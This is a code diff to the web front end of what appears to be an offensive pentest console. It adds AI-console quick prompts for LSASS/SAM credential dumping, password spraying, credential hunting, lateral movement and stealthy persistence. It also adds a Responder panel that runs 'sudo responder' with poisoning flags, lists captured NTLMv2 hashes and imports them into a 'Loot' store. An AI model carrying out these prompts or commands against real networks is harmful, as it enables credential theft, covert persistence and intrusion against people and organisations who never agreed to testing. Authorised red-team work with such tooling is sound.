@@ -418,6 +418,12 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 #aic-input-bar{padding:10px 14px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:flex-end;background:var(--bg2);flex-shrink:0}
 #aic-input{flex:1;resize:none;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:8px 10px;font-size:13px;font-family:inherit;min-height:40px;max-height:120px;line-height:1.4}
 #aic-input:focus{border-color:var(--accent);outline:none}
+#aic-chips{display:flex;overflow-x:auto;gap:6px;padding:6px 14px;border-top:1px solid var(--border);background:var(--bg3);flex-shrink:0;scrollbar-width:thin}
+#aic-chips::-webkit-scrollbar{height:3px}
+#aic-chips::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.aic-chip{flex-shrink:0;padding:3px 10px;border-radius:12px;border:1px solid var(--border2);background:var(--bg4);color:var(--text2);font-size:11px;font-family:var(--font-mono);cursor:pointer;transition:border-color .12s,color .12s,background .12s;white-space:nowrap}
+.aic-chip:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,.08)}
+.aic-chip:active{background:rgba(0,212,255,.18)}
 .aic-bubble{max-width:88%;padding:10px 14px;border-radius:10px;line-height:1.55;font-size:13px;word-break:break-word}
 .aic-bubble-user{background:var(--accent);color:#000;align-self:flex-end;border-bottom-right-radius:3px}
 .aic-bubble-assistant{background:var(--bg3);color:var(--text);align-self:flex-start;border-bottom-left-radius:3px;border:1px solid var(--border)}
@@ -679,6 +685,16 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
             <span id="aic-cc-status" style="display:none;font-size:10px;font-family:var(--font-mono);color:#5af78e">⚡ OAuth activo</span>
           </div>
           <div id="aic-messages"></div>
+          <div id="aic-chips">
+            <button class="aic-chip" onclick="aicChip('AD Enumeration')">AD Enumeration</button>
+            <button class="aic-chip" onclick="aicChip('Password Spray')">Password Spray</button>
+            <button class="aic-chip" onclick="aicChip('Priv Esc Check')">Priv Esc Check</button>
+            <button class="aic-chip" onclick="aicChip('Credentials Hunt')">Credentials Hunt</button>
+            <button class="aic-chip" onclick="aicChip('Network Scan')">Network Scan</button>
+            <button class="aic-chip" onclick="aicChip('Lateral Movement')">Lateral Movement</button>
+            <button class="aic-chip" onclick="aicChip('Dump Secrets')">Dump Secrets</button>
+            <button class="aic-chip" onclick="aicChip('Persistence')">Persistence</button>
+          </div>
           <div id="aic-input-bar">
             <textarea id="aic-input" rows="2" placeholder="Ask in natural language… 'list running processes', 'scan 10.0.0.1', 'who has admin rights?'"></textarea>
             <button class="btn btn-primary" onclick="aicSend()" style="min-width:52px;align-self:flex-end" title="Send (Enter)">↑</button>
@@ -1927,6 +1943,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <div class="ipc-tab"             data-ipc-tab="dump"     onclick="ipcTab('dump')">⬇ Dump</div>
                 <div class="ipc-tab"             data-ipc-tab="enum"     onclick="ipcTab('enum')">≡ Enum</div>
                 <div class="ipc-tab"             data-ipc-tab="spray"    onclick="ipcTab('spray')">⚡ Spray</div>
+                <div class="ipc-tab"             data-ipc-tab="responder" onclick="ipcTab('responder')">📡 Responder</div>
               </div>
 
               <!-- Panel: Cradles -->
@@ -2037,6 +2054,44 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 </div>
                 <div id="ipc-spray-hits" style="font-size:11px;color:var(--text3)">Hits: —</div>
                 <div id="ipc-spray-out" class="ipc-out" style="flex:1;max-height:260px"></div>
+              </div>
+
+
+              <!-- Panel: Responder -->
+              <div id="ipc-panel-responder" class="ipc-panel" style="padding:12px;gap:8px">
+                <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+                  <select id="resp-iface" style="flex:1;min-width:120px;max-width:180px;font-family:var(--font-mono);font-size:11px">
+                    <option value="">-- interface --</option>
+                  </select>
+                  <button class="btn btn-ghost btn-sm" onclick="respLoadIfaces()" title="Reload interfaces">↺</button>
+                  <label style="font-size:11px;color:var(--text3);display:flex;align-items:center;gap:4px"><input type="checkbox" id="resp-analyze"> Analyze (-A)</label>
+                  <label style="font-size:11px;color:var(--text3);display:flex;align-items:center;gap:4px"><input type="checkbox" id="resp-wpad" checked> WPAD (-w)</label>
+                  <label style="font-size:11px;color:var(--text3);display:flex;align-items:center;gap:4px"><input type="checkbox" id="resp-dns"> DNS (-d)</label>
+                  <button id="resp-btn-start" class="btn btn-primary btn-sm" onclick="respStart()">▶ Start</button>
+                  <button id="resp-btn-stop"  class="btn btn-danger  btn-sm" onclick="respStop()" style="display:none">■ Stop</button>
+                </div>
+                <div id="resp-output" class="ipc-out" style="flex:1;max-height:200px"></div>
+                <div style="display:flex;align-items:center;gap:8px">
+                  <span style="font-size:11px;font-weight:600;color:var(--text3)">Captured Hashes</span>
+                  <button class="btn btn-ghost btn-sm" onclick="respRefreshHashes()">↻ Refresh</button>
+                  <button class="btn btn-primary btn-sm" onclick="respImportAll()">⬇ Import All → Loot</button>
+                </div>
+                <div style="overflow-x:auto">
+                  <table style="width:100%;border-collapse:collapse;font-size:11px;font-family:var(--font-mono)">
+                    <thead>
+                      <tr style="color:var(--text3);border-bottom:1px solid var(--border)">
+                        <th style="text-align:left;padding:4px 6px;font-weight:500">User</th>
+                        <th style="text-align:left;padding:4px 6px;font-weight:500">Domain</th>
+                        <th style="text-align:left;padding:4px 6px;font-weight:500">IP</th>
+                        <th style="text-align:left;padding:4px 6px;font-weight:500;max-width:180px">Hash</th>
+                        <th style="text-align:left;padding:4px 6px;font-weight:500">Action</th>
+                      </tr>
+                    </thead>
+                    <tbody id="resp-hashes-tbody">
+                      <tr><td colspan="5" style="color:var(--text3);padding:8px 6px;font-style:italic">No hashes yet — start Responder or click ↻ Refresh</td></tr>
+                    </tbody>
+                  </table>
+                </div>
               </div>
 
             </div><!-- /int-pentest-right -->
@@ -16597,6 +16652,27 @@ async function aicCheckClaudeCode() {
   } catch(_) {}
 }
 
+// ── AI Console quick-query chips ─────────────────────────────────────────────
+const AIC_CHIPS = {
+  'AD Enumeration':   'Enumerate Active Directory: users, groups, domain controllers, trusts, and Kerberoastable accounts',
+  'Password Spray':   'Check for common/default passwords on domain accounts. Try password spraying with usernames found in the system',
+  'Priv Esc Check':   'Check for privilege escalation opportunities: unquoted service paths, writable services, token privileges, UAC bypass, scheduled tasks',
+  'Credentials Hunt': 'Search for cleartext credentials in files, registry, environment variables, and browser stored passwords',
+  'Network Scan':     'Scan the local network for live hosts and open ports on the 10.0.0.0/8 and 172.16.0.0/12 ranges from this machine',
+  'Lateral Movement': 'Identify lateral movement paths: local admin accounts on other hosts, shares, SMB signing disabled, pass-the-hash opportunities',
+  'Dump Secrets':     'Dump credentials from LSASS, SAM, and LSA secrets using available methods on this machine',
+  'Persistence':      'Suggest persistence mechanisms for this environment that would survive reboots without being obvious',
+};
+function aicChip(label) {
+  const q = AIC_CHIPS[label];
+  if (!q) return;
+  const el = document.getElementById('aic-input');
+  if (!el) return;
+  el.value = q;
+  el.dispatchEvent(new Event('input')); // triggers auto-height resize
+  el.focus();
+}
+
 function aicAddBubble(role, html, streaming) {
   const wrap = document.getElementById('aic-messages');
   const div = document.createElement('div');
@@ -18092,6 +18168,154 @@ async function ipcRun(action) {
   _ipcSetRunning(false);
   _ipcRunAbort = null;
   outEl.scrollTop = outEl.scrollHeight;
+}
+
+// ── Responder integration ─────────────────────────────────────────────────────
+let _respAbort = null;
+const _respHashes = []; // [{username,domain,ip,hash,captured_at}]
+
+async function respLoadIfaces() {
+  const sel = document.getElementById('resp-iface');
+  sel.innerHTML = '<option value="">loading…</option>';
+  try {
+    const lines = await _execOneshot('ip -o link show | awk -F": " \'{print $2}\' | cut -d@ -f1');
+    sel.innerHTML = '<option value="">-- interface --</option>';
+    lines.trim().split('\n').forEach(iface => {
+      iface = iface.trim();
+      if (!iface || iface === 'lo') return;
+      const opt = document.createElement('option');
+      opt.value = opt.textContent = iface;
+      if (iface.startsWith('eth') || iface.startsWith('ens') || iface.startsWith('tap')) opt.selected = true;
+      sel.appendChild(opt);
+    });
+  } catch(e) {
+    sel.innerHTML = '<option value="">-- error loading --</option>';
+  }
+}
+
+async function _execOneshot(cmd) {
+  const tok = TOKEN || window.__GUI_TOKEN__ || '';
+  const resp = await fetch('/exec', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json','Authorization':'Bearer '+tok},
+    body: JSON.stringify({cmd}),
+  });
+  const text = await resp.text();
+  // Each SSE frame is "data: <line>\n\n"; strip prefix, skip control events (exit code, done)
+  return text.split('\n')
+    .filter(l => l.startsWith('data:') && !l.includes('[done]') && !l.match(/^data:\s*\d+$/))
+    .map(l => l.slice(5).trimStart())
+    .join('\n');
+}
+
+async function respStart() {
+  const iface = document.getElementById('resp-iface').value.trim();
+  if (!iface) { toast('Select a network interface first', 'error'); return; }
+  const flags = ['-I', iface];
+  if (document.getElementById('resp-analyze').checked) flags.push('-A');
+  if (document.getElementById('resp-wpad').checked)    flags.push('-w');
+  if (document.getElementById('resp-dns').checked)     flags.push('-d');
+  const cmd = 'sudo responder ' + flags.join(' ');
+  const outEl = document.getElementById('resp-output');
+  outEl.innerHTML = '';
+  document.getElementById('resp-btn-start').style.display = 'none';
+  document.getElementById('resp-btn-stop').style.display  = '';
+  if (_respAbort) _respAbort.abort();
+  _respAbort = new AbortController();
+  const tok = TOKEN || window.__GUI_TOKEN__ || '';
+  try {
+    const resp = await fetch('/exec', {
+      method:'POST', signal:_respAbort.signal,
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+tok},
+      body:JSON.stringify({cmd}),
+    });
+    const reader = resp.body.getReader();
+    const dec = new TextDecoder();
+    let buf = '';
+    while (true) {
+      const {done, value} = await reader.read();
+      if (done) break;
+      buf += dec.decode(value, {stream:true});
+      const parts = buf.split('\n');
+      buf = parts.pop();
+      for (const part of parts) {
+        if (!part.startsWith('data:')) continue;
+        const line = part.slice(5);
+        if (line === '[done]') break;
+        outEl.innerHTML += _escHtml(line) + '\n';
+        outEl.scrollTop = outEl.scrollHeight;
+      }
+    }
+  } catch(e) {
+    if (e.name !== 'AbortError') outEl.innerHTML += `<span style="color:var(--red)">[error] ${_escHtml(e.message)}\n</span>`;
+  }
+  document.getElementById('resp-btn-start').style.display = '';
+  document.getElementById('resp-btn-stop').style.display  = 'none';
+  _respAbort = null;
+  respRefreshHashes();
+}
+
+function respStop() {
+  if (_respAbort) { _respAbort.abort(); _respAbort = null; }
+  _execOneshot('sudo pkill -x Responder 2>/dev/null; true').catch(()=>{});
+  document.getElementById('resp-btn-start').style.display = '';
+  document.getElementById('resp-btn-stop').style.display  = 'none';
+  setTimeout(respRefreshHashes, 1200);
+}
+
+async function respRefreshHashes() {
+  try {
+    const tok = TOKEN || window.__GUI_TOKEN__ || '';
+    const resp = await fetch('/ai/responder-logs', {headers:{'Authorization':'Bearer '+tok}});
+    const data = await resp.json();
+    if (!data.ok) return;
+    _respHashes.length = 0;
+    _respHashes.push(...(data.hashes || []));
+    respRenderHashes();
+  } catch(e) {}
+}
+
+function _escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function respRenderHashes() {
+  const tbody = document.getElementById('resp-hashes-tbody');
+  if (!tbody) return;
+  if (!_respHashes.length) {
+    tbody.innerHTML = '<tr><td colspan="5" style="color:var(--text3);padding:8px 6px;font-style:italic">No hashes captured yet</td></tr>';
+    return;
+  }
+  tbody.innerHTML = _respHashes.map((h,i) => `
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:4px 6px">${_escHtml(h.username)}</td>
+      <td style="padding:4px 6px">${_escHtml(h.domain)}</td>
+      <td style="padding:4px 6px">${_escHtml(h.ip)}</td>
+      <td style="padding:4px 6px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${_escHtml(h.hash)}">${_escHtml(h.hash.slice(0,40))}…</td>
+      <td style="padding:4px 6px"><button class="btn btn-ghost btn-sm" onclick="respSaveLoot(${i})">→ Loot</button></td>
+    </tr>`).join('');
+}
+
+async function respSaveLoot(idx) {
+  const h = _respHashes[idx];
+  if (!h) return;
+  const tok = TOKEN || window.__GUI_TOKEN__ || '';
+  try {
+    const resp = await fetch('/api/creds', {
+      method:'POST',
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+tok},
+      body: JSON.stringify({type:'NTLMv2',domain:h.domain,username:h.username,secret:h.hash,host:h.ip,source:'Responder'}),
+    });
+    if (resp.ok) { toast(`Saved ${h.domain}\\${h.username} → Loot`, 'success'); }
+    else { toast('Error saving hash', 'error'); }
+  } catch(e) { toast(e.message, 'error'); }
+}
+
+async function respImportAll() {
+  if (!_respHashes.length) { toast('No hashes to import', 'error'); return; }
+  let ok = 0;
+  for (let i = 0; i < _respHashes.length; i++) await respSaveLoot(i).then(()=>ok++).catch(()=>{});
+  toast(`Imported ${ok} hash(es) to Loot`, 'success');
 }
 
 async function ibuildAndDeploy() {
